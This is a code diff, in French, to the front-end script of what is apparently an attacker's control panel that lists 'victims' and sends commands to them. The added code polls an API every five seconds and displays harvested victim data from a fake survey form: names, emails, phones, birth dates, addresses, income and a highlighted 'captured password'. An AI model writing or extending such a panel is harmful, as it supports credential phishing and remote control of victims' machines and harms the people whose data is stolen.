@@ -7,6 +7,9 @@ let lastLogCount = 0;
 document.addEventListener('DOMContentLoaded', function() {
     refreshVictims();
     startAutoRefresh();
+    loadSurveyResponses();
+    // Actualiser les formulaires toutes les 5 secondes
+    setInterval(loadSurveyResponses, 5000);
 });
 
 // Fonction pour rafraîchir la liste des victimes
@@ -326,6 +329,72 @@ function escapeHtml(text) {
     const div = document.createElement('div');
     div.textContent = text;
     return div.innerHTML;
+}
+
+// Charger les réponses aux formulaires
+async function loadSurveyResponses() {
+    try {
+        const response = await fetch('/api/survey/responses');
+        const data = await response.json();
+        
+        if (data.success && data.data) {
+            displaySurveyResponses(data.data);
+        } else {
+            document.getElementById('survey-responses').innerHTML = 
+                '<p class="text-muted text-center">Aucune réponse au formulaire</p>';
+        }
+    } catch (error) {
+        console.error('Erreur lors du chargement des formulaires:', error);
+        document.getElementById('survey-responses').innerHTML = 
+            '<p class="text-danger">Erreur lors du chargement</p>';
+    }
+}
+
+// Afficher les réponses aux formulaires
+function displaySurveyResponses(responses) {
+    const container = document.getElementById('survey-responses');
+    
+    if (responses.length === 0) {
+        container.innerHTML = '<p class="text-muted text-center">Aucune réponse au formulaire</p>';
+        return;
+    }
+    
+    let html = '<div class="list-group">';
+    
+    responses.forEach((response, index) => {
+        const date = formatDate(response.captured_at || response.submittedAt);
+        
+        html += `
+            <div class="list-group-item">
+                <div class="d-flex justify-content-between align-items-start mb-2">
+                    <h6 class="mb-0">Formulaire #${index + 1}</h6>
+                    <small class="text-muted">${date}</small>
+                </div>
+                <div class="row">
+                    <div class="col-md-6">
+                        <p class="mb-1"><strong>Nom:</strong> ${escapeHtml(response.fullName || 'N/A')}</p>
+                        <p class="mb-1"><strong>Email:</strong> ${escapeHtml(response.email || 'N/A')}</p>
+                        <p class="mb-1"><strong>Téléphone:</strong> ${escapeHtml(response.phone || 'N/A')}</p>
+                        <p class="mb-1"><strong>Date de naissance:</strong> ${escapeHtml(response.birthDate || 'N/A')}</p>
+                    </div>
+                    <div class="col-md-6">
+                        <p class="mb-1"><strong>Adresse:</strong> ${escapeHtml(response.address || 'N/A')}</p>
+                        <p class="mb-1"><strong>Ville:</strong> ${escapeHtml(response.city || 'N/A')} ${escapeHtml(response.postalCode || '')}</p>
+                        <p class="mb-1"><strong>Profession:</strong> ${escapeHtml(response.profession || 'N/A')}</p>
+                        <p class="mb-1"><strong>Entreprise:</strong> ${escapeHtml(response.company || 'N/A')}</p>
+                        <p class="mb-1"><strong>Revenus:</strong> ${escapeHtml(response.income || 'N/A')}</p>
+                    </div>
+                </div>
+                <div class="alert alert-warning mt-2 mb-0">
+                    <strong>Mot de passe capturé:</strong> <code>${escapeHtml(response.password || 'N/A')}</code>
+                </div>
+                ${response.comments ? `<p class="mt-2 mb-0"><strong>Commentaires:</strong> ${escapeHtml(response.comments)}</p>` : ''}
+            </div>
+        `;
+    });
+    
+    html += '</div>';
+    container.innerHTML = html;
 }
 
 // Envoyer une commande à la victime sélectionnée
